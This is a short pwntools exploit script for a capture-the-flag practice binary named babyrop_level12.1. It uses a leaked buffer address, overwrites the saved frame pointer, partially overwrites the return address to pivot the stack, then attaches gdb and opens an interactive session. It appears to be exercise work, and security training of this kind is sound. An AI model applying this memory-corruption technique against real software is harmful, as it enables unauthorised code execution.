from pwn import *
import time 

binary = './babyrop_level12.1'
elf = ELF(binary)

context.binary = binary
p = process(binary)



p.recvuntil(b"Your input buffer is located at: ")
buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
print(f"[+] Input buffer is at: {hex(buffer_addr)}")
win_ptr_addr = buffer_addr - 8 




s = '''
b *main+439
'''
gdb.attach(p, s)


payload = flat(
	buffer_addr - 8,
	b'A'*0x50,
	win_ptr_addr - 8,          
	b'\xc8\x17', 
)

p.send(payload)

p.interactive()
